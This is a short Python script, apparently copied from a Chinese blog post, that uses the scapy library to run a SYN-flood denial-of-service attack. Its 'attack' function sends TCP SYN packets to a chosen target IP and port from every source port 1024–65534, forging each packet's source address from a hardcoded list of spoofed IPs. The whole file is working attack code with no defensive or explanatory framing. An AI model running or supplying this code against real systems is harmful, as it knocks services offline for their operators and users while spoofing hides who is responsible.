import random
from scapy.all import *


def attack(target_ip, dst_port):
    """
    :param target_ip: 目标IP
    :param dst_port: 目标端口
    :return:
    """
    src_list = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']  # 伪造的IP地址
    for src_port in range(1024, 65535):
        index = random.randrange(4)
        ip_layer = IP(src=src_list[index], dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=dst_port, flags="S")
        packets = ip_layer / tcp_layer
        send(packets)

# http://www.cnblogs.com/mrchige/p/6495147.html